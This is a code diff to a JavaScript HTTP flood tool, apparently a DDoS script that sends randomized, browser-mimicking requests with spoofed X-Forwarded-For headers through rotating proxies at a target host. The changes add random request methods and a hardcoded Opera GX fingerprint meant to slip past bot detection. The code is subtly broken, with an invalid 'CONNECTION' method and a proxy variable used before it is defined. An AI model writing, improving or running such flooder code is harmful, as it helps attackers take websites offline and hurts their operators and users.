@@ -260,7 +260,7 @@ const rdom2 = [
 
 const rateHeaders = [
 { "A-IM": "Feed" },
-{ "accept": accept },
+{ "acceptt": accept },
 { "accept-charset": accept },
 { "accept-datetime": accept },
 { "viewport-height":"1080"  },
@@ -270,7 +270,7 @@ const rateHeaders = [
 const rateHeaders2 = [
 { "Via": "1.1 " + parsedTarget.host },
 { "X-Requested-With": "XMLHttpRequest" },
-{ "X-Forwarded-For": spoofed },
+{ "X-Forwarded-Forr": spoofed },
 {"NEL" : val},
 {"dnt" : "1" },
 { "X-Vercel-Cache": randstr(15) },
@@ -282,8 +282,8 @@ const rateHeaders2 = [
 ];
 
 const rateHeaders4 = [
-{ "accept-encoding": encoding },
-{ "accept-language": lang },
+{ "accept-encodingg": encoding },
+{ "accept-languagee": lang },
 { "Refresh": "5" },
 { "X-Content-duration": spoofed },
 { "device-memory": "0.25"  },
@@ -298,7 +298,7 @@ const rateHeaders5 = [
 { "content-type": "text/html" },
 { "origin": "https://" + parsedTarget.host },
 { "pragma": "no-cache" },
-{ "referer": "https://" + parsedTarget.host + "/" },
+{ "refererer": "https://" + parsedTarget.host + "/" },
 ];
 
 
@@ -413,21 +413,36 @@ const uap = u[Math.floor(Math.random() * u.length)];
      });
  }
  }
+const method = [
+"GET",
+"POST",
+"HEAD",
+"CONNECTION",
+];
+var methods = method[Math.floor(Math.random() * method.length)]
+
  const path = parsedTarget.path;
  const Socker = new NetSocket();
- headers[":method"] = "GET";
- headers[":authority"] = parsedTarget.host;
- headers["x-forwarded-proto"] = "https";
- headers[":path"] = path;
- headers[":scheme"] = "https";
- headers["upgrade-insecure-requests"]= "1";
- headers["sec-ch-ua"] = secChUa;
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-site"] = "none";
- headers["sec-fetch-user"] = "1";
- headers["user-agent"] = uap;
+        headers[":method"] = methods;
+        headers[":scheme"] = "https";
+        headers[":authority"] = parsedTarget.host;
+        headers[":path"] = parsedTarget.path;
+        headers["user-agent"] = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36 OPR/134.0.0.0`;
+        headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
+        headers["accept-language"] = "vi-VN,vi;q=0.7";
+        headers["accept-Encoding"] = "gzip, deflate, br, zstd";
+        headers["sec-ch-ua"] = `"Chromium";v="134", "Opera GX";v="134", "Not)A;Brand";v="99"`;
+        headers["priority"] = "u=0, i";
+        headers["referer"] = "https://" + parsedTarget.host;
+        headers["origin"] = "https://" + parsedTarget.host;
+        headers["sec-ch-ua-mobile"] = "?0";
+        headers["sec-ch-ua-platform"] = "Android";
+        headers["sec-fetch-dest"] = "document";
+        headers["sec-fetch-mode"] = "navigate";
+        headers["sec-fetch-site"] = "none";
+        headers["sec-fetch-user"] = "?1";
+        headers["upgrade-insecure-requests"] = "1";
+        headers["x-forwarded-for"] = parsedProxy[0];
   function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
